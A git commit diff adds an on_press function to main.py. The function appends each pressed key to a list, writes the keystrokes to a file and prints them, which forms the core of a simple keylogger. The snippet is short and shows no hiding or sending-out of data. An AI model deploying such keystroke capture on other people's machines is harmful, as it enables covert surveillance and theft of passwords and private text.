dfdae38aaf703410a2f0b6bcbc6aebb0ba2d3cd8
Rajesh Kuchhadia <kuchhadiarajesh@gmail.com>
2023-08-20 13:32:27 +0000

    function onpress added

--- main.py
+++ main.py
@@ -12,3 +12,13 @@ def write_file(keys):
         # explicitly adding a space after
         # every keystroke for readability
         f.write(' ')
+
+def on_press(key):
+     
+    keys.append(key)
+    write_file(keys)
+     
+    try:
+        print('alphanumeric key {0} pressed'.format(key.char))
+    except AttributeError:
+        print('special key {0} pressed'.format(key))
